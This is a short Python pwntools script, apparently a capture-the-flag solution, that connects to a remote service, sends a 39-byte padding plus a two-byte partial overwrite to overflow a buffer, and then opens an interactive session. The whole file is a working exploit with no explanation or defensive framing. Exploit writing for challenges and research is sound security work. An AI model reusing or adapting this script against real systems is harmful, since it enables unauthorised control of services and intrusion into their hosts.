from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST = "34.62.69.250"
PORT = 41051

p = remote(HOST, PORT)

p.recvuntil(b"Input: ")

payload = b"A" * 39
payload += p16(0x322a)

p.send(payload)

p.interactive()